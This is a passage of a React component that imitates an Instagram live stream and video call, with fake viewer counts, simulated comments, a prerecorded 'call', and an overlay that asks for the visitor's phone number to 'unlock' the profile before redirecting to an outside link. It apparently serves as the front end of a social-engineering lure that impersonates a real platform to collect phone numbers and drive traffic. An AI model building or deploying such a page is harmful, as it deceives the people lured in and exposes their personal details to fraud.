          className="flex-1 bg-gradient-to-r from-yellow-400 to-orange-500 text-white text-[10px] font-bold py-2 rounded-lg shadow-sm active:scale-95 transition uppercase tracking-tighter"
        >
          Premium
        </button>

        <button 
          onClick={() => setStep('PREMIUM_VIDEO')}
          className="flex-1 bg-pink-600 text-white text-[10px] font-bold py-2 rounded-lg shadow-sm active:scale-95 transition uppercase tracking-tighter"
        >
          Video
        </button>

        <button 
          onClick={() => setStep('INBOX')}
          className="flex-1 bg-blue-500 text-white text-[10px] font-bold py-2 rounded-lg shadow-sm active:scale-95 transition uppercase tracking-tighter"
        >
          Friend
        </button>

        <div className="w-8 h-8 rounded-full border-2 border-gray-100 overflow-hidden shrink-0">
          <img src={targetProfile.image} className="w-full h-full object-cover" referrerPolicy="no-referrer" />
        </div>
      </nav>

      {/* STORY VIEWER */}
      <AnimatePresence>
        {showStories && (
          <motion.div 
            initial={{ opacity: 0, scale: 1.1 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 1.1 }}
            className="fixed inset-0 bg-black z-[100] flex flex-col"
          >
            <div className="absolute top-4 inset-x-0 flex px-2 z-50 gap-1">
              {ASSETS.stories.map((_, i) => (
                <div key={i} className="h-0.5 flex-1 bg-white/30 overflow-hidden">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: i === currentStoryIdx ? '100%' : (i < currentStoryIdx ? '100%' : '0%') }}
                    transition={{ duration: i === currentStoryIdx ? 5 : 0, ease: "linear" }}
                    className="h-full bg-white"
                  />
                </div>
              ))}
            </div>
            <div className="absolute top-8 left-4 flex items-center gap-2 z-50 text-white">
              <img src={targetProfile.image} className="w-8 h-8 rounded-full border border-white" referrerPolicy="no-referrer" />
              <span className="font-bold text-xs">{targetProfile.name}</span>
            </div>
            <button 
              className="absolute top-8 right-4 z-50 text-white" 
              onClick={() => setShowStories(false)}
            >
              <X className="w-8 h-8" />
            </button>
            <video 
              src={ASSETS.stories[currentStoryIdx]} 
              className="w-full h-full object-cover" 
              autoPlay 
              playsInline 
              onEnded={() => currentStoryIdx < ASSETS.stories.length - 1 ? setCurrentStoryIdx(prev => prev+1) : setShowStories(false)} 
            />
          </motion.div>
        )}
      </AnimatePresence>

      {/* LIVE PREVIEW OVERLAY */}
      <AnimatePresence>
        {showLivePreview && (
          <motion.div 
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: "spring", damping: 25, stiffness: 200 }}
            className="fixed inset-0 bg-black z-[100] flex flex-col"
          >
            <video 
              ref={videoRef}
              src={targetProfile.liveVideo || ASSETS.livePreview} 
              className={`w-full h-full object-cover transition-all duration-500 ${quality === 'SD' ? 'blur-sm' : 'blur-0'}`} 
              autoPlay loop playsInline 
              onTimeUpdate={() => {
                if (videoRef.current) {
                  setVideoProgress(videoRef.current.currentTime);
                }
              }}
              onLoadedMetadata={() => {
                if (videoRef.current) {
                  setVideoDuration(videoRef.current.duration);
                }
              }}
            />
            
            {/* Video Controls Overlay */}
            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
              <AnimatePresence>
                {isPaused && (
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.5 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.5 }}
                    className="bg-black/40 backdrop-blur-md p-6 rounded-full"
                  >
                    <Play className="w-12 h-12 text-white fill-white" />
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Seek Bar */}
            <div className="absolute bottom-64 inset-x-6 z-50 flex flex-col gap-1">
              <div className="flex justify-between text-[10px] text-white/70 font-mono">
                <span>{formatTime(Math.floor(videoProgress))}</span>
                <span>{formatTime(Math.floor(videoDuration))}</span>
              </div>
              <input 
                type="range"
                min="0"
                max={videoDuration || 100}
                value={videoProgress}
                onChange={(e) => {
                  const time = parseFloat(e.target.value);
                  setVideoProgress(time);
                  if (videoRef.current && isFinite(time)) videoRef.current.currentTime = time;
                }}
                className="w-full h-1 bg-white/20 rounded-lg appearance-none cursor-pointer accent-white"
              />
            </div>

            {/* Live Header */}
            <div className="absolute top-8 left-4 flex items-center gap-2 z-50 text-white">
              <img src={targetProfile.image} className="w-10 h-10 rounded-full border-2 border-pink-500 shadow-lg" referrerPolicy="no-referrer" />
              <div className="flex flex-col">
                <span className="font-bold text-sm">{targetProfile.name.toLowerCase().replace(' ', '_')} 🔴</span>
                <span className="text-[10px] opacity-80">{viewerCount.toLocaleString()} watching</span>
              </div>
            </div>

            {/* Quality Selector */}
            <div className="absolute top-8 right-16 z-50 flex gap-2">
              <button 
                onClick={() => setQuality('SD')} 
                className={`px-2 py-1 text-[10px] font-bold rounded border ${quality === 'SD' ? 'bg-white text-black border-white' : 'bg-black/40 text-white border-white/30'}`}
              >
                SD
              </button>
              <button 
                onClick={() => setQuality('HD')} 
                className={`px-2 py-1 text-[10px] font-bold rounded border ${quality === 'HD' ? 'bg-white text-black border-white' : 'bg-black/40 text-white border-white/30'}`}
              >
                HD
              </button>
            </div>

            <button 
              className="absolute top-8 right-4 z-50 text-white" 
              onClick={() => setShowLivePreview(false)}
            >
              <X className="w-8 h-8" />
            </button>

            {/* Comments Area (Simulated) */}
            <div className="absolute bottom-32 left-4 right-4 max-h-[40%] overflow-y-auto scrollbar-hide flex flex-col gap-2 z-50">
              {comments.filter(c => !bannedUsers.includes(c.user)).map(c => (
                <motion.div 
                  key={c.id} 
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  className="flex items-start gap-2 bg-black/20 backdrop-blur-sm p-2 rounded-lg max-w-[80%] group relative"
                >
                  <img src={c.avatar} className="w-6 h-6 rounded-full" referrerPolicy="no-referrer" />
                  <div className="flex flex-col flex-1">
                    <span className="text-[10px] font-bold text-white/70 flex items-center gap-1">
                      {c.user}
                      {mutedUsers.includes(c.user) && <MicOff className="w-2 h-2 text-red-400" />}
                    </span>
                    <span className={`text-xs text-white ${mutedUsers.includes(c.user) ? 'opacity-50 italic' : ''}`}>
                      {mutedUsers.includes(c.user) ? 'Message muted' : c.text}
                    </span>
                  </div>
                  
                  {/* Moderation Controls (Visible on hover or touch) */}
                  <div className="absolute -right-16 top-0 hidden group-hover:flex flex-col gap-1 bg-black/60 p-1 rounded-md">
                    <button 
                      onClick={() => {
                        if (mutedUsers.includes(c.user)) {
                          setMutedUsers(prev => prev.filter(u => u !== c.user));
                          addToast(`${c.user} unmuted`, 'info');
                        } else {
                          setMutedUsers(prev => [...prev, c.user]);
                          addToast(`${c.user} muted`, 'info');
                        }
                      }}
                      className="p-1 hover:bg-white/20 rounded text-[8px] text-white font-bold"
                    >
                      {mutedUsers.includes(c.user) ? 'UNMUTE' : 'MUTE'}
                    </button>
                    <button 
                      onClick={() => {
                        setBannedUsers(prev => [...prev, c.user]);
                        addToast(`${c.user} banned from chat`, 'error');
                      }}
                      className="p-1 hover:bg-red-500/40 rounded text-[8px] text-red-400 font-bold"
                    >
                      BAN
                    </button>
                  </div>
                </motion.div>
              ))}
              <div ref={commentsEndRef} />
            </div>

            {/* Interaction Buttons */}
            <div className="absolute bottom-10 inset-x-0 px-6 z-50 flex flex-col gap-3">
              <div className="flex gap-2 mb-2 items-center">
                <button 
                  onClick={() => {
                    if (videoRef.current) {
                      if (isPaused) videoRef.current.play();
                      else videoRef.current.pause();
                      setIsPaused(!isPaused);
                    }
                  }}
                  className="w-10 h-10 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center text-white active:scale-90 transition mr-2"
                >
                  {isPaused ? <Play className="w-5 h-5 fill-white" /> : <Pause className="w-5 h-5 fill-white" />}
                </button>
                {['❤️', '🔥', '👏', '😍', '😮'].map(emoji => (
                  <button 
                    key={emoji}
                    onClick={() => addReaction(emoji)}
                    className="w-10 h-10 bg-black/40 backdrop-blur-md rounded-full flex items-center justify-center text-xl active:scale-90 transition"
                  >
                    {emoji}
                  </button>
                ))}
              </div>
              <button 
                onClick={() => {setShowLivePreview(false); joinLive();}} 
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-4 rounded-xl font-bold shadow-2xl active:scale-95 transition"
              >
                JOIN CONVERSATION
              </button>
              <button 
                onClick={startVideoCall} 
                className="w-full bg-white/20 backdrop-blur-md text-white py-4 rounded-xl font-bold shadow-2xl active:scale-95 transition border border-white/30 flex items-center justify-center"
              >
                <Video className="w-5 h-5 mr-2" /> START VIDEO CALL
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* CALLING SCREEN */}
      <AnimatePresence>
        {step === 'CALLING' && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-gray-900 z-[100] flex flex-col items-center justify-between py-20"
          >
            <div className="text-center">
              <div className="w-32 h-32 rounded-full border-4 border-gray-700 p-1 mb-6 mx-auto">
                <img src={targetProfile.image} className="w-full h-full rounded-full object-cover" referrerPolicy="no-referrer" />
              </div>
              <h2 className="text-2xl font-bold text-white">{targetProfile.name}</h2>
              <p className="text-gray-400 mt-2 animate-pulse">Instagram video calling...</p>
            </div>
            <div className="flex flex-col items-center gap-8">
              <button 
                onClick={endCall} 
                className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center text-white shadow-lg shadow-red-500/40 active:scale-90 transition"
              >
                <PhoneOff className="w-8 h-8" />
              </button>
              <p className="text-white/50 text-xs">End Call</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* IN-CALL SCREEN */}
      <AnimatePresence>
        {step === 'IN_CALL' && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black z-[100] overflow-hidden"
          >
            {/* Main Background: Local Video (Prominent) */}
            <video 
              src={ASSETS.localVideo} 
              className={`w-full h-full object-cover transition-all duration-500 ${quality === 'SD' ? 'blur-sm' : 'blur-0'} ${isCameraOff ? 'hidden' : 'block'}`} 
              autoPlay 
              loop
              playsInline 
              muted
            />
            {isCameraOff && (
              <div className="w-full h-full bg-gray-900 flex items-center justify-center">
                <div className="w-32 h-32 rounded-full bg-gray-800 flex items-center justify-center border-4 border-gray-700">
                  <VideoOff className="w-16 h-16 text-gray-600" />
                </div>
              </div>
            )}

            {/* Corner: Remote Video (Smaller) */}
            <motion.div 
              drag
              dragConstraints={{ left: -100, right: 100, top: -100, bottom: 100 }}
              style={{ scale: remoteVideoScale }}
              className="absolute top-20 right-4 w-32 aspect-[3/4] rounded-2xl overflow-hidden border-2 border-white/30 shadow-2xl z-50 bg-black touch-none"
            >
              <video 
                src={targetProfile.liveVideo || ASSETS.videoCall} 
                className={`w-full h-full object-cover transition-all duration-500 ${quality === 'SD' ? 'blur-sm' : 'blur-0'}`} 
                autoPlay 
                playsInline 
                muted={!isSpeaker}
                onEnded={endCall}
              />
              <div className="absolute bottom-2 left-2 text-[10px] font-bold text-white drop-shadow-md">{targetProfile.name.split(' ')[0]}</div>
              
              {/* Resize Toggle */}
              <button 
                onClick={(e) => {
                  e.stopPropagation();
                  setRemoteVideoScale(prev => prev === 1 ? 1.5 : 1);
                }}
                className="absolute top-1 right-1 bg-black/40 p-1 rounded-full text-white"
              >
                {remoteVideoScale === 1 ? <Maximize2 className="w-3 h-3" /> : <Minimize2 className="w-3 h-3" />}
              </button>
            </motion.div>
            
            {/* Glitch Overlay */}
            {isGlitching && (
              <div className="absolute inset-0 pointer-events-none z-[60] mix-blend-overlay opacity-50 bg-gradient-to-t from-transparent via-white/20 to-transparent animate-pulse" />
            )}

            {/* Call Timer (Persistent & Clear) */}
            <div className="absolute top-12 left-1/2 -translate-x-1/2 z-50">
              <div className="bg-black/40 backdrop-blur-md px-4 py-1.5 rounded-full border border-white/20 flex items-center gap-2">
                <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                <span className="text-white font-mono text-sm font-bold tracking-wider">
                  {formatTime(callDuration)}
                </span>
              </div>
            </div>

            {/* Participants Toggle */}
            <div className="absolute top-12 left-6 z-50 flex flex-col gap-2 items-start">
              <button 
                onClick={() => setShowParticipants(!showParticipants)}
                className="bg-black/40 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/20 text-white text-[10px] font-bold flex items-center gap-2 active:scale-95 transition"
              >
                <Users className="w-3 h-3" />
                <span>{targetProfile.participantsCount || '1.2k'} Participants</span>
              </button>
              
              <AnimatePresence>
                {showParticipants && (
                  <motion.div 
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="bg-black/60 backdrop-blur-xl p-3 rounded-2xl border border-white/10 w-40"
                  >
                    <div className="flex flex-col gap-2">
                      {participants.map((p, idx) => (
                        <div key={idx} className="flex items-center gap-2">
                          <div className="w-5 h-5 rounded-full bg-gradient-to-tr from-pink-500 to-purple-500 flex items-center justify-center text-[8px] font-bold text-white">
                            {p[0]}
                          </div>
                          <span className="text-[10px] text-white/90 truncate">{p}</span>
                        </div>
                      ))}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Settings Overlay */}
            <AnimatePresence>
              {showSettings && (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.9 }}
                  className="absolute top-24 right-6 bg-black/80 backdrop-blur-xl p-4 rounded-2xl border border-white/20 z-[150] w-48 shadow-2xl"
                >
                  <h4 className="text-white font-bold text-sm mb-4 flex items-center gap-2">
                    <Settings className="w-4 h-4" />
                    Stream Settings
                  </h4>
                  <div className="flex flex-col gap-4">
                    <div>
                      <p className="text-[10px] text-white/50 uppercase font-bold mb-2">Quality</p>
                      <div className="flex gap-2">
                        {['SD', 'HD'].map(q => (
                          <button 
                            key={q}
                            onClick={() => setQuality(q as any)}
                            className={`flex-1 py-1.5 rounded-lg text-xs font-bold border transition ${quality === q ? 'bg-white text-black border-white' : 'bg-white/10 text-white border-white/20'}`}
                          >
                            {q}
                          </button>
                        ))}
                      </div>
                    </div>
                    <div>
                      <p className="text-[10px] text-white/50 uppercase font-bold mb-2">Bandwidth Mode</p>
                      <div className="flex gap-1">
                        {['AUTO', 'LOW', 'HIGH'].map(m => (
                          <button 
                            key={m}
                            onClick={() => {
                              setBandwidthMode(m as any);
                              if (m === 'LOW') setQuality('SD');
                              if (m === 'HIGH') setQuality('HD');
                            }}
                            className={`flex-1 py-1 rounded-lg text-[9px] font-bold border transition ${bandwidthMode === m ? 'bg-white text-black border-white' : 'bg-white/10 text-white border-white/20'}`}
                          >
                            {m}
                          </button>
                        ))}
                      </div>
                    </div>
                    <div>
                      <p className="text-[10px] text-white/50 uppercase font-bold mb-2">Network Simulation</p>
                      <button 
                        onClick={() => setEnableGlitches(!enableGlitches)}
                        className={`w-full py-1.5 rounded-lg text-xs font-bold border transition ${enableGlitches ? 'bg-pink-600 text-white border-pink-600' : 'bg-white/10 text-white border-white/20'}`}
                      >
                        {enableGlitches ? 'Glitches ON' : 'Glitches OFF'}
                      </button>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Settings Button */}
            <button 
              onClick={() => setShowSettings(!showSettings)}
              className="absolute top-12 right-6 z-50 bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/20 text-white active:scale-95 transition"
            >
              <Settings className="w-5 h-5" />
            </button>

            <div className="absolute bottom-12 inset-x-0 px-6 flex justify-between items-center z-50">
              <button 
                onClick={() => setIsMuted(!isMuted)} 
                className={`w-14 h-14 rounded-full flex items-center justify-center backdrop-blur-md border border-white/30 transition-colors ${isMuted ? 'bg-white text-black' : 'bg-black/40 text-white'}`}
              >
                {isMuted ? <MicOff className="w-6 h-6" /> : <Mic className="w-6 h-6" />}
              </button>

              {/* Mirroring Mute Button (Camera Toggle as requested "mirroring existing mic button functionality and appearance") */}
              <button 
                onClick={() => setIsCameraOff(!isCameraOff)} 
                className={`w-14 h-14 rounded-full flex items-center justify-center backdrop-blur-md border border-white/30 transition-colors ${isCameraOff ? 'bg-white text-black' : 'bg-black/40 text-white'}`}
              >
                {isCameraOff ? <VideoOff className="w-6 h-6" /> : <Video className="w-6 h-6" />}
              </button>
              
              <button 
                onClick={endCall} 
                className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center text-white shadow-xl active:scale-90 transition"
              >
                <PhoneOff className="w-10 h-10" />
              </button>

              <button 
                onClick={() => setIsSpeaker(!isSpeaker)} 
                className={`w-14 h-14 rounded-full flex items-center justify-center backdrop-blur-md border border-white/30 transition-colors ${!isSpeaker ? 'bg-white text-black' : 'bg-black/40 text-white'}`}
              >
                {isSpeaker ? <Volume2 className="w-6 h-6" /> : <VolumeX className="w-6 h-6" />}
              </button>
            </div>

            {/* Participants List Modal */}
            <AnimatePresence>
              {showParticipants && (
                <motion.div 
                  initial={{ y: '100%' }}
                  animate={{ y: 0 }}
                  exit={{ y: '100%' }}
                  className="absolute inset-x-0 bottom-0 bg-black/90 backdrop-blur-xl rounded-t-3xl z-[100] p-6 border-t border-white/10"
                >
                  <div className="flex justify-between items-center mb-6">
                    <h4 className="text-white font-bold text-lg">Call Participants ({targetProfile.participantsCount || '1.2k'})</h4>
                    <button onClick={() => setShowParticipants(false)} className="text-white/60">
                      <X className="w-6 h-6" />
                    </button>
                  </div>
                  <div className="flex flex-col gap-4">
                    {participants.map((p, idx) => (
                      <div key={idx} className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-yellow-400 to-purple-600 p-0.5">
                          <div className="w-full h-full rounded-full bg-black flex items-center justify-center text-white text-xs font-bold">
                            {p[0]}
                          </div>
                        </div>
                        <div className="flex-1">
                          <p className="text-white text-sm font-medium">{p}</p>
                          <p className="text-white/40 text-[10px]">{idx === 0 ? 'Host' : 'Participant'}</p>
                        </div>
                        {idx === 1 && <span className="text-[10px] bg-white/10 text-white/60 px-2 py-1 rounded">You</span>}
                      </div>
                    ))}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        )}
      </AnimatePresence>

      {/* FINAL SUCCESS UNLOCK */}
      <AnimatePresence>
        {step === 'SUCCESS' && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="fixed inset-0 bg-black z-[100]"
          >
            <video 
              ref={videoRef}
              src={targetProfile.liveVideo || ASSETS.livePreview} 
              className={`w-full h-full object-cover transition-all duration-500 ${quality === 'SD' ? 'blur-sm' : 'blur-0'}`} 
              autoPlay loop playsInline 
              onTimeUpdate={(e) => setVideoProgress(e.currentTarget.currentTime)}
              onLoadedMetadata={(e) => setVideoDuration(e.currentTarget.duration)}
            />
            
            {/* Glitch Overlay */}
            {isGlitching && (
              <div className="absolute inset-0 pointer-events-none z-[60] mix-blend-overlay opacity-50 bg-gradient-to-t from-transparent via-white/20 to-transparent animate-pulse" />
            )}
            
            {/* Back Button */}
            <button 
              onClick={goBack}
              className="absolute top-8 left-4 z-[110] bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/20 text-white active:scale-95 transition"
            >
              <ArrowLeft className="w-6 h-6" />
            </button>
            
            {/* Live Header */}
            <div className="absolute top-8 left-16 flex items-center gap-3 z-50 text-white">
              <img src={targetProfile.image} className="w-12 h-12 rounded-full border-2 border-pink-600 shadow-xl" referrerPolicy="no-referrer" />
              <div>
                <div className="flex items-center gap-1">
                  <span className="font-bold text-sm">{targetProfile.name}</span>
                  <CheckCircle2 className="w-3 h-3 text-blue-400" />
                </div>
                <span className="text-[10px] bg-red-600 px-1.5 rounded-sm font-bold">LIVE STREAMING</span>
              </div>
            </div>

            {/* Quality Selector */}
            <div className="absolute top-8 right-16 z-50 flex gap-2">
              <button 
                onClick={() => setShowSettings(!showSettings)}
                className="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/20 text-white active:scale-95 transition"
              >
                <Settings className="w-5 h-5" />
              </button>
            </div>

            {/* Settings Overlay */}
            <AnimatePresence>
              {showSettings && (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.9 }}
                  className="absolute top-24 right-6 bg-black/80 backdrop-blur-xl p-4 rounded-2xl border border-white/20 z-[150] w-48 shadow-2xl"
                >
                  <h4 className="text-white font-bold text-sm mb-4 flex items-center gap-2">
                    <Settings className="w-4 h-4" />
                    Stream Settings
                  </h4>
                  <div className="flex flex-col gap-4">
                    <div>
                      <p className="text-[10px] text-white/50 uppercase font-bold mb-2">Quality</p>
                      <div className="flex gap-2">
                        {['SD', 'HD'].map(q => (
                          <button 
                            key={q}
                            onClick={() => setQuality(q as any)}
                            className={`flex-1 py-1.5 rounded-lg text-xs font-bold border transition ${quality === q ? 'bg-white text-black border-white' : 'bg-white/10 text-white border-white/20'}`}
                          >
                            {q}
                          </button>
                        ))}
                      </div>
                    </div>
                    <div>
                      <p className="text-[10px] text-white/50 uppercase font-bold mb-2">Bandwidth Mode</p>
                      <div className="flex gap-1">
                        {['AUTO', 'LOW', 'HIGH'].map(m => (
                          <button 
                            key={m}
                            onClick={() => {
                              setBandwidthMode(m as any);
                              if (m === 'LOW') setQuality('SD');
                              if (m === 'HIGH') setQuality('HD');
                            }}
                            className={`flex-1 py-1 rounded-lg text-[9px] font-bold border transition ${bandwidthMode === m ? 'bg-white text-black border-white' : 'bg-white/10 text-white border-white/20'}`}
                          >
                            {m}
                          </button>
                        ))}
                      </div>
                    </div>
                    <div>
                      <p className="text-[10px] text-white/50 uppercase font-bold mb-2">Network Simulation</p>
                      <button 
                        onClick={() => setEnableGlitches(!enableGlitches)}
                        className={`w-full py-1.5 rounded-lg text-xs font-bold border transition ${enableGlitches ? 'bg-pink-600 text-white border-pink-600' : 'bg-white/10 text-white border-white/20'}`}
                      >
                        {enableGlitches ? 'Glitches ON' : 'Glitches OFF'}
                      </button>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Comments Area */}
            <div className="absolute bottom-24 left-4 right-4 max-h-[30%] overflow-y-auto scrollbar-hide flex flex-col gap-2 z-50">
              {comments.filter(c => !bannedUsers.includes(c.user)).map(c => (
                <motion.div 
                  key={c.id} 
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  className="flex items-start gap-2 bg-black/20 backdrop-blur-sm p-2 rounded-lg max-w-[80%] group"
                >
                  <img src={c.avatar} className="w-6 h-6 rounded-full" referrerPolicy="no-referrer" />
                  <div className="flex flex-col flex-1">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-bold text-white/70">{c.user}</span>
                      {c.user !== 'You' && (
                        <div className="hidden group-hover:flex gap-2">
                          <button onClick={() => handleModeration(c.user, 'mute')} className="text-[8px] text-white/50 hover:text-white">Mute</button>
                          <button onClick={() => handleModeration(c.user, 'ban')} className="text-[8px] text-red-400/70 hover:text-red-400">Ban</button>
                        </div>
                      )}
                    </div>
                    <span className="text-xs text-white">{mutedUsers.includes(c.user) ? '...muted...' : c.text}</span>
                  </div>
                </motion.div>
              ))}
              <div ref={commentsEndRef} />
            </div>

            {/* Video Controls Overlay */}
            <div className="absolute inset-0 flex items-center justify-center pointer-events-none z-[40]">
              <AnimatePresence>
                {isPaused && (
                  <motion.div 
                    initial={{ scale: 0.5, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    exit={{ scale: 1.5, opacity: 0 }}
                    className="bg-black/40 p-6 rounded-full"
                  >
                    <PlayCircle className="w-16 h-16 text-white" />
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Seek Bar */}
            <div className="absolute bottom-[220px] inset-x-6 z-50 flex flex-col gap-1">
              <div className="flex justify-between text-[10px] text-white/60 font-mono">
                <span>{formatTime(Math.floor(videoProgress))}</span>
                <span>{formatTime(Math.floor(videoDuration))}</span>
              </div>
              <div 
                className="h-1 bg-white/20 rounded-full overflow-hidden cursor-pointer relative"
                onClick={(e) => {
                  const rect = e.currentTarget.getBoundingClientRect();
                  const x = e.clientX - rect.left;
                  const pct = x / rect.width;
                  if (videoRef.current) {
                    const newTime = pct * videoRef.current.duration;
                    if (isFinite(newTime)) {
                      videoRef.current.currentTime = newTime;
                    }
                  }
                }}
              >
                <div 
                  className="h-full bg-pink-500" 
                  style={{ width: `${(videoProgress / videoDuration) * 100}%` }}
                />
              </div>
            </div>

            {/* Interaction Footer */}
            <div className="absolute bottom-6 inset-x-0 px-4 z-50 flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <div className="flex gap-2">
                  {['❤️', '🔥', '👏', '😍', '😮'].map(emoji => (
                    <button 
                      key={emoji}
                      onClick={() => addReaction(emoji)}
                      className="w-10 h-10 bg-black/40 backdrop-blur-md rounded-full flex items-center justify-center text-xl active:scale-90 transition"
                    >
                      {emoji}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                    <button 
                      onClick={() => {
                        if (videoRef.current) {
                          if (isPaused) {
                            videoRef.current.play();
                            setIsPaused(false);
                          } else {
                            videoRef.current.pause();
                            setIsPaused(true);
                          }
                        }
                      }}
                      className="w-10 h-10 bg-black/40 backdrop-blur-md rounded-full flex items-center justify-center text-white active:scale-90 transition"
                    >
                      {isPaused ? <Play className="w-5 h-5" /> : <Pause className="w-5 h-5" />}
                    </button>
                </div>
              </div>
              <form onSubmit={handleSendComment} className="flex gap-2">
                <input 
                  type="text" 
                  placeholder="Add a comment..." 
                  className="flex-1 bg-black/40 backdrop-blur-md border border-white/20 rounded-full px-4 py-2 text-white text-sm outline-none focus:border-white/40"
                  value={newComment}
                  onChange={(e) => setNewComment(e.target.value)}
                />
                <button 
                  type="submit"
                  className="bg-white text-black px-4 py-2 rounded-full font-bold text-xs active:scale-95 transition"
                >
                  SEND
                </button>
              </form>
              <button 
                onClick={() => window.location.href = REDIRECT_LINK} 
                className="w-full bg-white/10 backdrop-blur-md text-white py-3 rounded-xl font-bold text-xs uppercase tracking-tighter border border-white/20"
              >
                View imo Profile
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* REMOTE UNLOCK OVERLAY */}
      <AnimatePresence>
        {showRemoteUnlock && (
          <motion.div 
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 50 }}
            className="fixed inset-0 bg-white z-[300] flex flex-col items-center justify-center px-8 text-center"
          >
            <button 
              onClick={() => setShowRemoteUnlock(false)}
              className="absolute top-6 right-6 p-2 text-gray-400 hover:text-black transition"
            >
              <X className="w-8 h-8" />
            </button>

            <div className="flex justify-center mb-6">
              <img src={targetProfile.image} className="w-24 h-24 rounded-full border p-1 border-gray-100 shadow-sm" referrerPolicy="no-referrer" />
            </div>
            
            <h2 className="text-2xl font-bold mb-2">{targetProfile.name}</h2>
            <p className="text-gray-600 text-sm mb-10 font-medium">Unlock profile to start voice or video call</p>
            
            <div className="w-full max-w-xs">
              <input 
                type="tel" 
                placeholder="Phone number" 
                className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 mb-6 focus:border-pink-500 outline-none font-bold text-center text-lg transition-all"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
              
              <button 
                onClick={() => {
                  setShowRemoteUnlock(false);
                  handlePhoneSubmit();
                }} 
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white font-bold py-4 rounded-xl text-sm shadow-xl active:scale-95 transition-all uppercase tracking-widest"
              >
                JOIN LIVE NOW
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
